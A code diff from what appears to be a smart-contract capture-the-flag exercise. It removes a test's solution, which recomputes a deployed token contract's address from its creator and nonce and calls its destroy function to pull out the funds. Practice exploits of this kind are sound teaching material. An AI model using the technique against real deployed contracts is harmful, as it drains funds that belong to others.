@@ -20,16 +20,6 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
-  const recomputedContractAddress = ethers.utils.getContractAddress({
-    from: challenge.address,
-    nonce: BigNumber.from(`1`),
-  });
-  console.log(`recomputedContractAddress`, recomputedContractAddress)
-
-  const attackerFactory = await ethers.getContractFactory(`SimpleToken`);
-  attacker = await attackerFactory.attach(recomputedContractAddress);
-  tx = await attacker.destroy(await eoa.getAddress());
-  await tx.wait();
 });
 
 after(async () => {
